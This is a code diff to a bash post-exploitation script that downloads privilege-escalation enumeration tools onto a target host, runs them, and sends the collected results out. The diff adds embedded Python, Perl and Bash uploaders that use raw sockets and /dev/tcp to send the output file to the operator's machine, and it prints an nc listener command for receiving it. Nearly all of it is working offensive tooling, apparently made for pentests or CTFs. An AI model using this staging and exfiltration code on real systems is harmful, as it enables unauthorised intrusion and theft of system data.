@@ -17,8 +17,9 @@
 # --- Customisable configuration ---
 OWN_IP="127.0.0.1"
 DOWLOADED_PORT=80
-TARGET_IP="10.1.1.2"
-TARGET_UPLOAD_PORT=8090
+UPLOADED_PORT=8100
+TARGET_IP="10.1.1.2"      # TODO: remove
+TARGET_UPLOAD_PORT=8090   # TODO: remove
 OUTPUT="local_enumeration.txt"
 
 DEBUG=0
@@ -43,7 +44,6 @@ FORCE_DOWNLOAD=1
 # 5-scriptargs     : The args used to run the scripts <arg1,arg2,arg3,...>
 # 6-integritycheck : The MD5Sum of the script in order to verify his integrity
 FILES_TO_DOWNLOAD=$(cat <<-END
-LinEnum/LinEnum.sh;;;bash;;047221a55de17485c651c83c8a9db329
 unix-privesc-check/upc.sh;;;sh;;ddcfe959895ad6a1e8c3e9c31cee0702
 Bashark/bashark.sh;noexec;;;;dccf86ce980294721c0fffd9dd0c3850
 pspy/pspy32;noexec;;;;b3b3d7ea8ccf37813c67ae0c58ab0cff
@@ -71,6 +71,13 @@ PL_DOWNLOADER_NAME="downloader.pl"
 PL_DOWNLOADER="use Socket;\nuse warnings;\nuse strict;\nmy \$remote = '$OWN_IP';\nmy \$port = $DOWLOADED_PORT;\nif (\$#ARGV != 1) {\nprint \"Usage: downloader.py <remote-file-to-download> <local-output-path>\n\";\nexit(1);\n}\nmy \$buff_size = 4096;\nmy \$proto = getprotobyname('tcp');\nmy \$file_to_download = \$ARGV[0];\nmy \$output = \$ARGV[1];\nmy(\$sock);\nsocket(\$sock, AF_INET, SOCK_STREAM, \$proto) or exit(1);\nmy \$iaddr = inet_aton(\$remote) or exit(1);\nmy \$paddr = sockaddr_in(\$port, \$iaddr);\nconnect(\$sock , \$paddr) or exit(1);\nmy \$req = sprintf(\"GET /%s HTTP/1.1"$n"Host:%s$n$n\", \$file_to_download, \$remote);\nsend(\$sock, \$req, 0) or exit(1);\nmy \$content = \"\";\nmy \$content_length = 0;\nmy \$line_count = 0;\nmy \$is_content = 0;\nwhile (my \$line = <\$sock>)\n{\n\$line_count += 1;\nif (\$line_count > 7) {\n\$content .= \$line;\nnext;\n}\nif (\$line =~ m/HTTP\/1\.0 (?<status_code>[0-9]{3})/) {\nif ($+{status_code} != 200) {\nexit(1);\n}\nnext;\n}\nif (\$line =~ m/Content-Length\: (?<lenght>[0-9]+)/) {\n\$content_length = $+{lenght};\nnext;\n}\n}\nif (length(\$content) != \$content_length) {\nexit(1);\n}\nopen(FH, '>', \$output) or exit(1);\nprint FH \$content;\nclose(FH);\nclose(\$sock);\nexit(0);"
 SH_DOWNLOADER_NAME="downloader.sh"
 SH_DOWNLOADER="#!/bin/bash\nip=\"$OWN_IP\"\nport=$DOWLOADED_PORT\nfile_to_download=\$1\noutput=\$2\nif [ -z \"\$file_to_download\" ] && [ -z \"\$output\" ]\nthen\necho \"Usage: downloader.sh <remote-file-to-download> <local-output-path>\"\nexit 1\nfi\nexec 3<>/dev/tcp/\"\$ip\"/\"\$port\"\necho -e \"GET /\$file_to_download HTTP/1.1$n""Host: \$ip$n""Connection: close$n$n\" >&3\nfor i in `seq 1 7`;\ndo\nread -u 3 line\nif [[ \$line =~ ^HTTP/1\.0[[:blank:]]([0-9]{3}) ]]\nthen\nif [ \${BASH_REMATCH[1]} != \"200\" ]\nthen\nexit 1\nfi\nfi\ndone\nwhile [ 1 ]\ndo\nread -u 3 line\nif [ -z \"\$line\" ]\nthen\nbreak\nfi\necho \$line >> \$output\ndone\nexec 3<&-\nexit 0\n"
+
+PY_UPLOADER_NAME="uploader.py"
+PY_UPLOADER="import socket,sys,os\ntarget_host = \"$OWN_IP\"\ntarget_port = $UPLOADED_PORT\nif len(sys.argv) != 2 or os.path.isfile(sys.argv[1]) == False:\n\tprint(\"Usage: uploader.sh <local-file-to-upload>\")\n\tsys.exit(1)\nfile_to_upload = sys.argv[1]\ndata = b''\ns=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.connect((target_host,target_port))\nf=open(file_to_upload, \"rb\")\ndata = f.read()\ns.send(data.encode())\nf.close()\ns.close()\nsys.exit(0)"
+PL_UPLOADER_NAME="uploader.pl"
+PL_UPLOADER="use Socket;\nuse warnings;\nuse strict;\nmy \$remote = '$OWN_IP';\nmy \$port = $UPLOADED_PORT;\nmy \$file_to_upload = \$ARGV[0];\nif (!defined(\$file_to_upload) || ! -e \$file_to_upload) {\n    print \"Usage: uploader.sh <local-file-to-upload>\\n\";\n    exit(1);\n}\nmy \$proto = getprotobyname('tcp');\nmy(\$sock);\nsocket(\$sock, AF_INET, SOCK_STREAM, \$proto) or exit(1);\nmy \$iaddr = inet_aton(\$remote) or exit(1);\nmy \$paddr = sockaddr_in(\$port, \$iaddr);\nconnect(\$sock , \$paddr) or exit(1);\nopen(my \$fh, '<', \$file_to_upload) or exit(1);\nwhile(my \$row = <\$fh>){\n    send(\$sock, \$row, 0) or exit(1);\n}\nclose(\$fh);\nclose(\$sock);\nexit(0);"
+SH_UPLOADER_NAME="uploader.sh"
+SH_UPLOADER="#!/bin/bash\nip=\"$OWN_IP\"\nport=$UPLOADED_PORT\nfile_to_upload=\$1\nif [ -z \"\$file_to_upload\" ] || [ ! -f \$file_to_upload ]\nthen\n    echo \"Usage: uploader.sh <local-file-to-upload>\"\n    exit 1\nfi\nexec 4<>/dev/tcp/\"\$ip\"/\"\$port\"\ncat \$file_to_upload >&4\nexec 4<&-\nexit 0"
 
 BANNER="#####################################################################\n#   LOCAL ENUMRATION ON THE MACHINE : $TARGET_IP\n#   This file is the result of the $NAME script\n#   Author: Antoine Brunet (Lovebug)\n#####################################################################\n"
 
@@ -607,13 +614,12 @@ execute_scripts() {
         script_local_path=$(opt_get_url $file)
         script_bin=$(opt_get_execbin $file)
         script_args=$(opt_get_scriptargs $file)
-        bin=$(get_absolute_bin_path $script_bin)
         script_name=${script_local_path##*\/}
         file_to_exec=$TARGET_DOWNLOAD_PATH$script_name
 
         if [ "$noexec" = "noexec" ]
         then
-            log_info "The script \`$script_name\` will not be executed"
+            log_info "noexec flag found for the script \`$script_name\`, it will not be executed"
             continue
         fi
 
@@ -623,6 +629,7 @@ execute_scripts() {
             continue
         fi
         
+        bin=$(get_absolute_bin_path $script_bin)
         log_info "Execution of the script \`$file_to_exec\`"
         splitter $script_name
 
@@ -644,11 +651,37 @@ execute_scripts() {
 }
 
 upload_results() {
+    # Python
     cmd_bin=$($CMD_TEST python 2>/dev/null)
     if [ $? -eq 0 ]
     then
-        python -m SimpleHTTPServer $TARGET_UPLOAD_PORT > /dev/null 2>&1 &
-        log_info "You can download the results file with the following link: ${BGreen}http://$TARGET_IP:$TARGET_UPLOAD_PORT/$OUTPUT"
+        echo $PY_UPLOADER > $TARGET_DOWNLOAD_PATH$PY_UPLOADER_NAME
+        log_info "A Python script has been created: $TARGET_DOWNLOAD_PATH$PY_UPLOADER_NAME"
+        log_debug "The python script \`$TARGET_DOWNLOAD_PATH$PY_UPLOADER_NAME\` will be used to upload the scripts results"
+        $cmd_bin $TARGET_DOWNLOAD_PATH$PY_UPLOADER_NAME $OUTPUT
+        return
+    fi
+
+    # Perl
+    cmd_bin=$($CMD_TEST perl 2>/dev/null)
+    if [ $? -eq 0 ]
+    then
+        echo $PL_UPLOADER > $TARGET_DOWNLOAD_PATH$PL_UPLOADER_NAME
+        log_info "A Perl script has been created: $TARGET_DOWNLOAD_PATH$PL_UPLOADER_NAME"
+        log_debug "The perl script \`$TARGET_DOWNLOAD_PATH$PL_UPLOADER_NAME\` will be used to upload the scripts results"
+        $cmd_bin $TARGET_DOWNLOAD_PATH$PL_UPLOADER_NAME $OUTPUT
+        return
+    fi
+
+    # Bash
+    cmd_bin=$($CMD_TEST bash 2>/dev/null)
+    if [ $? -eq 0 ]
+    then
+        echo $SH_UPLOADER > $TARGET_DOWNLOAD_PATH$SH_UPLOADER_NAME
+        log_info "A Bash script has been created: $TARGET_DOWNLOAD_PATH$SH_UPLOADER_NAME"
+        log_debug "The Bash script \`$TARGET_DOWNLOAD_PATH$SH_UPLOADER_NAME\` will be used to upload the scripts results"
+        $cmd_bin $TARGET_DOWNLOAD_PATH$SH_UPLOADER_NAME $OUTPUT
+        return
     fi
 }
 
@@ -678,5 +711,8 @@ log_info "---- Execute downloaded scripts ----"
 execute_scripts
 
 # Open a web server to download the results file
-log_info "---- Upload file ----"
+log_info "---- Upload results ----"
+log_info "Run this command on your machine to get back the results of the scripts: ${BPurple}nc -lvnp $UPLOADED_PORT > $OUTPUT"
+echo "${BPurple}Press Enter to continue...${NC}"
+read INPUT_STRING
 upload_results
